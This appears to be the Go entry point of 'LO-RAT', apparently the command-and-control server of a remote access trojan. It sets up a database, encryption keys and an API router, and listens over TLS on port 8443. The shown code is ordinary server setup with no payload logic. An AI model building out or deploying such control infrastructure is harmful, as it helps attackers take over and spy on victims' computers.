package main

import (
    "log"
    "net/http"
    "LO-RAT/server/internal/api"
    "LO-RAT/server/internal/db"
    "LO-RAT/server/internal/crypto"
)

func main() {
    db.Init("lorat.db")
    crypto.InitKeys()
    
    router := api.NewRouter()
    
    log.Println("LO-RAT Server listening on :8443")
    log.Fatal(http.ListenAndServeTLS(":8443", "certs/server.crt", "certs/server.key", router))
}